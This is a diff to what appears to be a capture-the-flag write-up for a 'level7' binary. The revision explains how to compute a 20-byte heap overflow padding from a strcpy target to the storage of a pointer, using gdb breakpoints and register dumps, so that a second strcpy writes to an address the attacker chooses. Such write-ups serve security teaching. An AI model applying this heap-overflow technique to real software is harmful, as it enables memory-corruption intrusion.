@@ -36,20 +36,41 @@ $ objdump -R level7 | grep puts
 
 ## Exploit
 
-### Offset from a[1] to b[1]
+### Padding: from the strcpy1 target to the b[1] pointer
 
-Break before the first strcpy, dump the heap from `a[1]` (in `eax`):
+Be careful with names here. `a[1]` and `b[1]` are pointers, and each has two different addresses:
+
+- its **value**: the chunk it points to (where a `strcpy` writes).
+- its **storage**: the slot on the heap that holds the pointer itself (`&b[1]` = `b + 4`).
+
+The first `strcpy` writes to the **value** of `a[1]`. What we want to corrupt is the **storage** of `b[1]`, so that the second `strcpy` writes to a location of our choice. So the padding is:
 
 ```
-(gdb) b *0x080485a0
-(gdb) r AAAA BBBB
-(gdb) info registers eax
-eax            0x804a018                  <- a[1]
-(gdb) x/20x $eax
-0x804a028: 0x00000002 0x0804a038 ...      <- b[0], then b[1]
+&b[1] (storage of the b[1] pointer)  -  a[1] value (target of strcpy1)
 ```
 
-`a[1]` = `0x0804a018`, `b[1]` = `0x0804a02c`, offset = `0x14` = **20 bytes**.
+The four malloc chunks come back in `eax` one after another. Break right after malloc #2 (gives the value of `a[1]`) and after malloc #3 (gives `b`, so `&b[1] = b + 4`):
+
+```
+(gdb) b *0x08048550        # after a[1] = malloc(8)
+(gdb) b *0x08048565        # after b    = malloc(8)
+(gdb) run AAAA BBBB
+Breakpoint 1 ...
+(gdb) p/x $eax
+$1 = 0x804a018             <- a[1] value = target of strcpy1
+(gdb) c
+Breakpoint 2 ...
+(gdb) p/x $eax
+$2 = 0x804a028            <- b
+(gdb) p/x $eax + 4
+$3 = 0x804a02c           <- &b[1], the pointer we overwrite
+(gdb) p/d 0x804a02c - 0x804a018
+$4 = 20
+```
+
+Padding = `0x804a02c - 0x804a018` = `0x14` = **20 bytes**.
+
+> Do not confuse `&b[1]` (`0x804a02c`, where the pointer lives) with the value of `b[1]` (`0x804a038`, the chunk it points to). The distance between the two *values* is 32 bytes and is not what the exploit uses; the padding is the distance to the pointer's **storage**, 20 bytes.
 
 ### Run
 
